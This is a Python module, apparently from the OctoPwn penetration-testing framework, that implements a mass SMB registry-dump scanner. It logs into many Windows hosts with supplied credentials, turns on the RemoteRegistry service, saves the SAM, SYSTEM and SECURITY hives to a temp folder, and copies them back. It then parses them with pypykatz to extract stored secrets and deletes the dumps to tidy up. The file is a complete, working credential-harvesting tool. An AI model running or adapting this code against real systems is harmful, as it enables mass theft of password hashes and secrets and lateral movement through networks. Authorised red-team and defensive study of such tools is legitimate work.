import traceback
import asyncio
import os
import copy
import platform
from typing import cast

from octopwn.clients.scannerbase import ScannerConsoleBase
from aiosmb.commons.interfaces.machine import SMBMachine
from pypykatz.registry.aoffline_parser import OffineRegistry
from pypykatz.alsadecryptor.asbmfile import SMBFileReader
from aiosmb.commons.interfaces.file import SMBFile
from aiosmb.dcerpc.v5.common.service import SMBServiceStatus

from aiosmb.commons.connection.factory import SMBConnectionFactory
from octopwn.remote.protocol.python import messages_pb2, smb_pb2
from octopwn.clients.scannerbase import ScannerConsoleBase
from asyauth.common.constants import asyauthProtocol
from asysocks.unicomm.common.scanner.targetgen import UniTargetGen
from asysocks.unicomm.common.scanner.scanner import UniScanner
from asysocks.unicomm.common.scanner.common import ScannerResultType, ScannerData, ScannerInfo, ScannerError

class SMBRegdumpResult:
	def __init__(self, regsecrets):
		self.regsecrets = regsecrets
	
	def to_line(self, separator = '\t'):
		return str(self.regsecrets)

class SMBRegdumpExecutor:
	def __init__(self, factory:SMBConnectionFactory, srvwaittime = 4):
		self.factory:SMBConnectionFactory = factory
		self.srvwaittime = srvwaittime
	
	async def run(self, targetid, target, out_queue):
		try:
			connection = self.factory.create_connection_newtarget(target)
			async with connection:
				_, err = await connection.login()
				if err is not None:
					raise err

				machine = SMBMachine(connection)
				waittime = self.srvwaittime
				hives = ['HKLM\\SAM', 'HKLM\\SYSTEM', 'HKLM\\SECURITY']
				remote_base_path = 'C:\\Windows\\Temp\\'
				remote_share_name = '\\c$\\Windows\\Temp\\'

				if remote_base_path.endswith('\\') is False:
					remote_base_path += '\\'

				if remote_share_name.endswith('\\') is False:
					remote_share_name += '\\'

				po = None
				await out_queue.put(ScannerInfo(target, 'Checking remote registry service status...'))
				status, err = await machine.check_service_status('RemoteRegistry')
				if err is not None:
					raise err
					
				await out_queue.put(ScannerInfo(target, 'Remote registry service status: %s' % status.name))
				if status != SMBServiceStatus.RUNNING:
					await out_queue.put(ScannerInfo(target, 'Enabling Remote registry service'))
					_, err = await machine.enable_service('RemoteRegistry')
					if err is not None:
						raise err
					await out_queue.put(ScannerInfo(target, 'Starting Remote registry service'))
					_, err = await machine.start_service('RemoteRegistry')
					if err is not None:
						raise err
					await out_queue.put(ScannerInfo(target, 'Waiting for RemoteRegistry service...'))
					await asyncio.sleep(waittime)

				await out_queue.put(ScannerInfo(target, 'Remote registry service should be running now...'))
				files = {}
				for hive in hives:
					fname = '%s.%s' % (os.urandom(4).hex(), os.urandom(3).hex())
					remote_path = remote_base_path + fname
					remote_sharepath = remote_share_name + fname
					remote_file = SMBFileReader(SMBFile.from_remotepath(machine.connection, remote_sharepath))
					files[hive.split('\\')[1].upper()] = remote_file
						
					await out_queue.put(ScannerInfo(target, 'Dumping reghive %s to (remote) %s' % (hive, remote_path)))
					_, err = await machine.save_registry_hive(hive, remote_path)
					if err is not None:
						raise err
					
				await out_queue.put(ScannerInfo(target, 'Waiting for regfile dump to be written to disk...'))
				await asyncio.sleep(waittime)
						
				for rfilename in files:
					rfile = files[rfilename]
					await out_queue.put(ScannerInfo(target, 'Opening reghive file %s' % rfilename))
					_, err = await rfile.open(machine.connection)
					if err is not None:
						raise err
								
				try:
					await out_queue.put(ScannerInfo(target, 'Parsing hives...'))
					po = await OffineRegistry.from_async_reader(
						files['SYSTEM'], 
						sam_reader = files.get('SAM'), 
						security_reader = files.get('SECURITY'), 
						software_reader = files.get('SOFTWARE')
					)
				except Exception as e:
					await out_queue.put(ScannerInfo(target, 'ERR! Failed to parse reghive files! Reason: %s' %  e))
				else:
					await out_queue.put(ScannerInfo(target, 'Hives parsed OK!'))
					
				await out_queue.put(ScannerInfo(target, 'Deleting remote files...'))
				err = None
				for rfilename in files:
					rfile = files[rfilename]
					err = await rfile.close()
					if err is not None:
						await out_queue.put(ScannerInfo(target, 'ERR! Failed to close hive dump file! %s' % rfilename))

					_, err = await rfile.delete()
					if err is not None:
						await out_queue.put(ScannerInfo(target, 'ERR! Failed to close hive dump file! %s' % rfilename))
								
				if err is None:
					await out_queue.put(ScannerInfo(target, 'Deleting remote files OK!'))
					
				await out_queue.put(ScannerData(target, SMBRegdumpResult(po)))

		except Exception as e:
			await out_queue.put(ScannerError(target, e))
			return None, e

class SMBRegdumpScanner(ScannerConsoleBase):
	def __init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj):
		ScannerConsoleBase.__init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj)
		self.nologon_commands.append('any')

		self.params = {
			'credential': (int, None, 'CID of credential to use'),
			'targets' : (list, [], 'List of targets to scan. IP/CDIR/file/hostname'),
			'targetfiles' : (list, []),
			'authtype': (str, 'NTLM', 'Authenticaton protocol'),
			'workercount' : (int,100, 'Parallelization'),
			'srvwaittime' : (int,10, 'Give up on server after N seconds'),
			'proxy': (int, None, 'PID of proxy to use'),
			'resultsfile': (str, 'smb_scan_regdump_%s.txt' % os.urandom(4).hex(), 'File path to write results to. Set it to empty string to print results to screen')
		}

		self.enumerator_task = None
		self.monitor_task = None
		self.results_ctr = 0
		self.total_ctr = 0
	
	async def start(self):
		if platform.system().lower() == 'emscripten' and self.params['proxy'][1] is None:
			
			await self.do_setparam('proxy', 0)
		return True, None
	
	async def do_stop(self):
		try:
			self.enumerator_task.cancel()
			await self.print('[!] Scan stopped!')
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
		finally:
			self.scan_running = False	
	
	async def __monitor_queue(self, h_token = None, h_clientid = None):
		try:
			current_percent = 0.0
			outfile = None
			if self.params['resultsfile'][1] is not None and len(self.params['resultsfile'][1]) != 0:
				resfile = self.octopwnobj.sanitize_path(self.params['resultsfile'][1])
				outfile = open(resfile, 'a', newline = '')
			async for result in self.enumerator.scan():
				if result.type == ScannerResultType.STARTED:
					await self.print("Scan running!")
				elif result.type == ScannerResultType.FINISHED:
					await self.print("Scan finished!")
				elif result.type == ScannerResultType.INFO:
					await self.print(str(result.to_line('|')))
				elif result.type == ScannerResultType.PROGRESS:
					if h_token is not None:
						msg = messages_pb2.ScannerProgressEvt()
						msg.totalStages = 1
						msg.currentStage = 1
						msg.totalTargets = result.total
						msg.finishedTargets = result.current
						await self.remotemsg(msg)

					if result.total is not None and result.total > 0:
						percent = round((result.current / result.total)*100, 2)
						if abs(current_percent - percent) > 0.5:
							await self.print('[+] Scan progress: %s/%s (%s %%)' % (result.current, result.total, percent))
							current_percent = percent
				elif result.type == ScannerResultType.ERROR:
					await self.print(str(result.to_line('|')))
				
				elif result.type == ScannerResultType.DATA:
					for line in str(result.data.regsecrets).split('\n'):
						line=line.strip()
						line = '%s|%s' % (result.resid, line)
						if outfile is not None:
							outfile.write(line + '\r\n')
						else:
							await self.print(line)

					tid, err = await self.add_target(result.resid, source=str(type(self).__name__))					
			
			await self.print('[+] Scan finished!')
			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
		finally:
			msg = messages_pb2.ScannerStoppedEvt()
			await self.remotemsg(msg)

			self.scan_running = False
			if self.enumerator_task is not None:
				self.enumerator_task.cancel()
			if outfile is not None:
				outfile.close()


	async def do_scan(self, h_token = None, h_clientid = None):
		"""Start enumeration"""
		try:
			if self.scan_running is True:
				await self.print("Scan is still running. Can\'t start new scan here")
				return
			
			connection_factory, err = self.octopwnobj.get_smb_factory_dummy(
				self.params['credential'][1],
				authtype = asyauthProtocol(self.params['authtype'][1].upper()),
				pid = self.params['proxy'][1], 
				timeout = 5
			)
			if err is not None:
				raise err
			
			target_gens = UniTargetGen()
			
			for target in self.params['targetfiles'][1]:
				target_gens.add_file(target)
			
			target_gens.add_list(self.params['targets'][1])
			executors = [SMBRegdumpExecutor(connection_factory, self.params['srvwaittime'][1])]

			self.enumerator = UniScanner(
				str(type(self).__name__),
				executors,
				target_gens,
				worker_count = self.params['workercount'][1],
				host_timeout = 20
			)
		
			self.enumerator_task = asyncio.create_task(self.__monitor_queue(h_token, h_clientid))
			self.scan_running = True
			await self.print('[+] Scan started!')
			if self.params['resultsfile'][1] is not None and len(self.params['resultsfile'][1]) != 0:
				await self.print('[+] Results will be written to: %s' % self.params['resultsfile'][1])
			
			msg = messages_pb2.ScannerStartedEvt()
			await self.remotemsg(msg)

			return True, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	